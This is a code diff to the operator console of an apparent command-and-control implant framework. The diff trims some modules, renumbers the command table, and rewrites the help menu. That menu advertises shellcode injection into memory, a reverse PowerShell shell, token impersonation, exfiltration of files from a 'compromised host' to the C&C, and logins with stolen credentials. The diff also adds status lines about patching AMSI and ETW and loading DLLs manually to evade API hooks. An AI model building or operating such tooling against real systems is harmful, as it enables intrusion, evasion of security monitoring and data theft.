@@ -2,13 +2,10 @@ import os
 import string
 from command import Command
 from download import Download
-from execute import Execute
-from move import Move
 from base64encode import Base64encode
 from base64decode import Base64decode
 from compilation import Compile
 from inject import Inject
-from downexec import Downexec
 from shell import Shell
 from powershell import Powershell
 from send import Send
@@ -49,19 +46,16 @@ def executeCommand(com):
 
 	commands = {
 	'download' : 0,
-	'execute' : 1,
-	'copy' : 2,
-	'base64encode' : 3,
-	'base64decode' : 4,
-	'compile' : 5,
-	'inject' : 6,
-	'downexec' : 7,
-	'psh': 8,
-	'send' : 9,
-	'impersonate' : 10,
-	'exfiltrate' : 11,
-	'runas' : 12,
-	'help' : 13
+	'base64encode' : 1,
+	'base64decode' : 2,
+	'compile' : 3,
+	'inject' : 4,
+	'psh': 5,
+	'send' : 6,
+	'impersonate' : 7,
+	'exfiltrate' : 8,
+	'runas' : 9,
+	'help' : 10
 	}
 
 	return commands.get(com.lower(), -1)
@@ -71,20 +65,17 @@ def printHelp():
 	helpstr = """\n| ** Use "<command> help" for more detailed info about the following options.
 |
 | download     : Download a file from a remote host to the compromised machine.
-| execute      : Run an executable file.
-| copy         : Copy a file to a different path.
 | base64encode : Use Base64 to encode a file's content.
 | base64decode : Decode a base64 encoded file.
-| compile      : Compile file to dll or exe.
-| inject       : Inject and execute in memory a dll or shellcode (.bin) file.
-| downexec     : Download file from remote host and execute it.
-| psh          : Generate a remote powershell shell.
+| compile      : Compile a .cs file to .dll or .exe.
+| inject       : Inject and execute in memory a PE (dll or exe) or shellcode.
+| psh          : Obtain a reverse powershell connection.
 | send         : Send a file from your C2C to the compromised host.
 | getsystem    : Attempt to obtain System privileges.
 | rev2self     : Get back to the initial security context.
 | list         : List all processes running in the compromised host.
-| impersonate  : Impersonate other user by token duplication.
-| exfiltrate   : Upload a file from the compromised machine to your C&C host.
+| impersonate  : Impersonate other user.
+| exfiltrate   : Upload a file from the compromised host to your C&C.
 | runas        : Log in as other local or domain user using valid credentials.
 | * Any OS shell command * -> Execute the command in a cmd.
 |_________________________________________________________ _ _ _ _ _ _ _ _ _ _ _  
@@ -187,6 +178,19 @@ def main():
 
 	content = waitAndReadFile(baseReadPath + prevId)
 
+	print("[+] Connection successfully established!")
+	time.sleep(3)
+	print("[+] Patching ETW...")
+	time.sleep(7)
+	print("[+] Manually loading kernel32.dll to avoid API hooks.")
+	time.sleep(7)
+	print("[+] Manually loading advapi32.dll to avoid API hooks.")
+	time.sleep(5)
+	print("[+] Patching AMSI...")
+	time.sleep(5)
+	print("[+] H4ck th3 Pl4n3t!")
+
+
 	userAndDomain = content['Output']
 	userAndDomain = userAndDomain.split("\\")
 	_domain = userAndDomain[0]
@@ -195,13 +199,10 @@ def main():
 
 
 	_classes.append(Download())
-	_classes.append(Execute())
-	_classes.append(Move())
 	_classes.append(Base64encode())
 	_classes.append(Base64decode())
 	_classes.append(Compile())
 	_classes.append(Inject())
-	_classes.append(Downexec())
 	_classes.append(Powershell())
 	_classes.append(Send())
 	_classes.append(Impersonate())
